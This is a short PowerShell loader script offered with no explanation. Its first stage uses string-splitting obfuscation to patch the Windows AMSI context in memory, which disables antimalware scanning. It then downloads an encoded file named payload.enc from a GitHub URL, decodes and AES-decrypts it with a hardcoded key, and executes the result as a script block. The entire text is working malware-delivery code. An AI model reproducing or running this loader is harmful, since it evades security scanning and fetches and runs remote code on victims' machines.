# Setup
$w = 'System.Management.Automation.A'
$c = 'si'
$m = 'Utils'
$t = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$f = $t.GetField(('am{0}Context' -f $c),'NonPublic,Static')
$v = $f.GetValue($null)
$p = [System.IntPtr]::Add([System.IntPtr]$v, 0x8)
$b = New-Object byte[](8)
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $p, 8)

# Download
$u = 'https://raw.githubusercontent.com/raacineagency/update-payload/refs/heads/main/payload.enc'
$d = "$env:TEMP\p.enc"
(New-Object Net.WebClient).DownloadFile($u, $d)
$x = [System.IO.File]::ReadAllText($d) -replace '\s',''
$e = [Convert]::FromBase64String($x)

# Decrypt
$k = [Text.Encoding]::ASCII.GetBytes("0123456789abcdef0123456789abcdef")
$i = [Text.Encoding]::ASCII.GetBytes("0123456789abcdef")
$a = [Security.Cryptography.Aes]::Create()
$a.Key = $k
$a.IV = $i
$a.Mode = 'CBC'
$a.Padding = 'PKCS7'
$o = $a.CreateDecryptor().TransformFinalBlock($e, 0, $e.Length)

# Execute
$s = [Text.Encoding]::UTF8.GetString($o)
[ScriptBlock]::Create($s).Invoke()
